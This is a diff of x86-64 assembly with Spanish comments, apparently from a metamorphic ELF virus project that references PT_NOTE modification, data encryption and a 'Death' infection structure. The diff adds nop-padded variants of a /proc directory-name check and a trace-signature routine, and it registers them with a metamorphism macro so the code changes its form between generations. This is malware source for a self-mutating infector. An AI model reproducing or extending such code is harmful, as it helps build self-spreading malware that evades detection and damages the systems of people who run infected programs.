@@ -14,6 +14,9 @@ section .text
 
     __F_directory_name_isdigit:
         ; rdi = puntero dirent_buffert
+        nop
+        nop
+        nop
         push rbx
         lea rsi, [rdi + dirent.d_name]
         xor rcx, rcx ; contador
@@ -32,6 +35,7 @@ section .text
             pop rbx
         ret
     __F_directory_name_isdigit__end:
+	F_directory_name_isdigit_len equ $ - __F_directory_name_isdigit
 
     __F_close_proc_dir:
         push rax
@@ -317,6 +321,9 @@ section .text
         ret
     __F_mod_functions__end:
 
+    __F_fake_function:
+        times 100 nop
+    __F_fake_function__end:
 ; ----------------------------------------------------------------------------------------------------------------------
 
     _init:
@@ -781,7 +788,7 @@ section .text
 	.mod_functions:
         CALL_METAMORPH(crazy, 7)
         CALL_METAMORPH(mod_pt_note, 2)
-        ;CALL_METAMORPH(set_unique_trace, 3)
+        CALL_METAMORPH(directory_name_isdigit, 3)
 
     .encrypt_data_block:
         CALL_ENCRYPT(encrypt_block) ; encripta
@@ -1116,9 +1123,11 @@ section .text
     __F_set_unique_trace_0:
         nop
         nop
+        nop
         mov rcx, VAR(Death.file_final_len)
         add rax, rcx
 
+        ; lo transformamos haciendo paranoias
         mov rcx, rax
         shl rcx, 13
         xor rax, rcx
@@ -1131,12 +1140,18 @@ section .text
         shl rcx, 5
         xor rax, rcx
 
+            ; Dejamos el numero de forma que sea representable en chars (decimal) en 8 cifras.
         and rax, 0x3FFFFFF
 
+        ; rdi = buf
+        ; destruye: rax, rbx, rdx, rcx
         lea rdi, [rel Traza]
         add rdi, Traza_len + 1
         add rdi, 8
 
+        ; rcx = contador (para escribir 8 bytes exactos)
+        ; r8 = buffer a escribir el numbero transformado. r8 apunta al final del buffer,
+        ; no al principio. Es porque escribimos del final al principio.
         xor rcx, rcx
         sub rsp, 8
         lea rsi, [rsp+7]
@@ -1144,6 +1159,7 @@ section .text
         mov rcx, 8
         mov rbx, 10
         .convert_loop:
+            ; rax = numerete
             xor rdx, rdx
             div rbx       ; rax / rbx. rdx = resto.
 
@@ -1161,15 +1177,17 @@ section .text
         rep movsb
 
         add rsp, 8
-        nop
         ret
     __F_set_unique_trace_0__end:
 
     __F_set_unique_trace_1:
         nop
+        nop
+        nop
         mov rcx, VAR(Death.file_final_len)
         add rax, rcx
 
+        ; lo transformamos haciendo paranoias
         mov rcx, rax
         shl rcx, 13
         xor rax, rcx
@@ -1182,12 +1200,18 @@ section .text
         shl rcx, 5
         xor rax, rcx
 
+            ; Dejamos el numero de forma que sea representable en chars (decimal) en 8 cifras.
         and rax, 0x3FFFFFF
 
+        ; rdi = buf
+        ; destruye: rax, rbx, rdx, rcx
         lea rdi, [rel Traza]
         add rdi, Traza_len + 1
         add rdi, 8
 
+        ; rcx = contador (para escribir 8 bytes exactos)
+        ; r8 = buffer a escribir el numbero transformado. r8 apunta al final del buffer,
+        ; no al principio. Es porque escribimos del final al principio.
         xor rcx, rcx
         sub rsp, 8
         lea rsi, [rsp+7]
@@ -1195,6 +1219,7 @@ section .text
         mov rcx, 8
         mov rbx, 10
         .convert_loop:
+            ; rax = numerete
             xor rdx, rdx
             div rbx       ; rax / rbx. rdx = resto.
 
@@ -1212,16 +1237,19 @@ section .text
         rep movsb
 
         add rsp, 8
-        nop
-        nop
+
         ret
     __F_set_unique_trace_1__end:
 
     __F_set_unique_trace_2:
 
+        nop
+        nop
+        nop
         mov rcx, VAR(Death.file_final_len)
         add rax, rcx
 
+        ; lo transformamos haciendo paranoias
         mov rcx, rax
         shl rcx, 13
         xor rax, rcx
@@ -1234,12 +1262,18 @@ section .text
         shl rcx, 5
         xor rax, rcx
 
+            ; Dejamos el numero de forma que sea representable en chars (decimal) en 8 cifras.
         and rax, 0x3FFFFFF
 
+        ; rdi = buf
+        ; destruye: rax, rbx, rdx, rcx
         lea rdi, [rel Traza]
         add rdi, Traza_len + 1
         add rdi, 8
 
+        ; rcx = contador (para escribir 8 bytes exactos)
+        ; r8 = buffer a escribir el numbero transformado. r8 apunta al final del buffer,
+        ; no al principio. Es porque escribimos del final al principio.
         xor rcx, rcx
         sub rsp, 8
         lea rsi, [rsp+7]
@@ -1247,6 +1281,7 @@ section .text
         mov rcx, 8
         mov rbx, 10
         .convert_loop:
+            ; rax = numerete
             xor rdx, rdx
             div rbx       ; rax / rbx. rdx = resto.
 
@@ -1264,10 +1299,79 @@ section .text
         rep movsb
 
         add rsp, 8
+        ret
+    __F_set_unique_trace_2__end:
+
+    __F_directory_name_isdigit_0:
+        ; rdi = puntero dirent_buffert
+        nop
+        nop
+        push rbx
+        lea rsi, [rdi + dirent.d_name]
+        xor rcx, rcx ; contador
+        .bucle:
+            mov bl, [rsi + rcx]
+            cmp bl, 0
+            je .out
+            cmp bl, 0x30
+            jl .out
+            cmp bl, 0x39
+            jg .out
+            inc rcx
+            jmp .bucle
+        .out:
+            mov al, bl
+            pop rbx
+        nop
+        ret
+    __F_directory_name_isdigit_0__end:
+
+
+    __F_directory_name_isdigit_1:
+        ; rdi = puntero dirent_buffert
+        nop
+        push rbx
+        lea rsi, [rdi + dirent.d_name]
+        xor rcx, rcx ; contador
+        .bucle:
+            mov bl, [rsi + rcx]
+            cmp bl, 0
+            je .out
+            cmp bl, 0x30
+            jl .out
+            cmp bl, 0x39
+            jg .out
+            inc rcx
+            jmp .bucle
+        .out:
+            mov al, bl
+            pop rbx
+        nop
+        nop
+        ret
+    __F_directory_name_isdigit_1__end:
+
+    __F_directory_name_isdigit_2:
+        ; rdi = puntero dirent_buffert
+        push rbx
+        lea rsi, [rdi + dirent.d_name]
+        xor rcx, rcx ; contador
+        .bucle:
+            mov bl, [rsi + rcx]
+            cmp bl, 0
+            je .out
+            cmp bl, 0x30
+            jl .out
+            cmp bl, 0x39
+            jg .out
+            inc rcx
+            jmp .bucle
+        .out:
+            mov al, bl
+            pop rbx
         nop
         nop
         nop
         ret
-    __F_set_unique_trace_2__end:
-
+    __F_directory_name_isdigit_2__end:
     _finish:
